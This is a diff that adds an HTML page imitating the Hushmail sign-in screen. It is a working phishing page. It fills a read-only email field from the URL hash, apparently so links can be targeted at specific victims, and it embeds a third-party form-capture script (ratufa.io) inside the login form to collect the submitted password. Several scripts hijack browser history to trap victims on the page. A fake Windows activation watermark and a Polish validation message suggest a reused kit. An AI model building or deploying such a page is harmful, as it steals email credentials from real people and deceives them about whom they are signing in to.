@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hushmail - Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 40px;
+            position: relative;
+        }
+
+        /* Top Left Header Nav Links */
+        .top-nav {
+            font-size: 13px;
+            color: #555555;
+            margin-bottom: 60px;
+        }
+
+        .top-nav a {
+            color: #0c69b0;
+            text-decoration: none;
+        }
+
+        .top-nav a:hover {
+            text-decoration: underline;
+        }
+
+        /* Centered Workspace Form Layout Wrapper */
+        .workspace-container {
+            width: 100%;
+            max-width: 320px;
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        /* Brand Typography Logo Area with Orange Keyhole Graphic Asset */
+        .brand-logo-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .brand-text {
+            font-size: 32px;
+            font-weight: 800;
+            color: #0c69b0;
+            letter-spacing: -0.5px;
+        }
+
+        .keyhole-icon {
+            width: 28px;
+            height: 28px;
+            background-color: #ff6600;
+            border-radius: 50%;
+            margin-left: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333333;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        /* Input Container Structure with Left Icon Box matching light blue frame */
+        .input-wrapper {
+            display: flex;
+            width: 100%;
+            border: 1px solid #5aa5d8;
+            background-color: #ffffff;
+        }
+
+        .icon-box {
+            width: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5aa5d8;
+            font-size: 14px;
+            border-right: 1px solid #e0e0e0;
+            background-color: #ffffff;
+        }
+
+        .form-control {
+            flex: 1;
+            padding: 10px 12px;
+            border: none;
+            font-size: 14px;
+            color: #000000;
+            outline: none;
+            background: transparent;
+        }
+
+        .form-control::placeholder {
+            color: #a0a0a0;
+            font-weight: 300;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            bottom: 10px;
+            color: #777777;
+            cursor: pointer;
+            font-size: 16px;
+            user-select: none;
+        }
+
+        /* Sharp Blue rectangular action button matching screenshot blueprint layout precisely */
+        .submit-btn {
+            background-color: #3192dc;
+            color: #ffffff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            margin-top: 4px;
+        }
+
+        .submit-btn:hover {
+            background-color: #1e7ec9;
+        }
+
+        /* Desktop environment layout decoration system watermark overlay reproduction */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.15);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Ribbon Area Links -->
+    <nav class="top-nav">
+        <a href="#">Home</a> | <a href="#">Mail</a>
+    </nav>
+
+    <!-- Center Interactive Workspace Column -->
+    <main class="workspace-container">
+        
+        <div class="brand-logo-wrapper">
+            <span class="brand-text">Hushmail</span>
+            <div class="keyhole-icon">🔑</div>
+        </div>
+    <br>
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <div class="input-wrapper">
+                    <div class="icon-box">✉️</div>
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+            </div>
+
+            <!-- Newly Integrated Structured Secure Password Field Entry Module Section -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="input-wrapper">
+                    <div class="icon-box">🔒</div>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    <span class="password-toggle">👁</span>
+                </div>
+            </div>
+            
+            <button type="submit" class="submit-btn">Continue</button>
+        </form>
+    </main>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+ <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
